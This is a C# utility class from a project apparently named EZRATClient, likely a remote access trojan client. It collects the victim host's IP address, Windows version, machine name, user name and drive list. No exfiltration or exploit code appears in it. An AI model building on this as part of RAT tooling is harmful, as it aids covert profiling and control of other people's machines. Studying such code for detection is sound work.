using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace EZRATClient.Utils
{
    static class SystemInfo
    {

        public static string GetLocalIPAddress()
        {
            string hostName = Dns.GetHostName(); // Retrive the Name of HOST
            // Get the IP  
            IPAddress[] tmp = Dns.GetHostByName(hostName).AddressList;
            return tmp[tmp.Length - 1].ToString();
            throw new Exception("No network adapters with an IPv4 address in the system!");
        }


        public static string GetWindowsVersion()
        {
            var key = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion";
            return Registry.LocalMachine.OpenSubKey(key).GetValue("ProductName").ToString();
        }

        public static string GetMachineName()
        {
            return Environment.MachineName;
        }

        public static string GetUserName()
        {
            return System.Security.Principal.WindowsIdentity.GetCurrent().Name;
        }

        public static string[] GetDrives()
        {
            string[] result = Environment.GetLogicalDrives();
            return result;
        }

    }
}
